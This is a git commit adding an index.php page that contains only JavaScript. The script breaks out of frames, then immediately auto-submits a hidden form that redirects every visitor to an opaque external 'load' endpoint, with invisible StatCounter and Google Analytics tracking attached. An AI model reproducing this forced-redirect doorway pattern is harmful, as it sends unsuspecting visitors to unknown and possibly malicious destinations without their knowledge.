4d18a35ccad204ea4886f840776055f12bb86fef
JabX-dev <56755891+JabX-dev@users.noreply.github.com>
2022-01-23 08:11:02 -0500

    Add files via upload

---
+++ index.php
@@ -0,0 +1,35 @@
+<script>
+(function(window) {
+  if (window.location !== window.top.location) {
+    window.top.location = window.location;
+  }
+})(this);
+
+</script>
+<form action="https://load.xxxdb.io/api/direct/336652" method="GET" name="redirected"></form>
+<script>
+   setTimeout(function() {
+      document.forms.redirected.submit();
+   }, 1);
+</script>
+<script type="text/javascript">
+var sc_project=12422506; 
+var sc_invisible=1; 
+var sc_security="6a300e20"; 
+var sc_remove_link=1; 
+</script>
+<script type="text/javascript"
+src="https://www.statcounter.com/counter/counter.js"
+async></script>
+<noscript><div class="statcounter"><img class="statcounter"
+src="https://c.statcounter.com/12422506/0/6a300e20/1/"
+alt="Web Analytics Made Easy -
+StatCounter"></div></noscript>
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-189866556-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-189866556-1');
+</script>
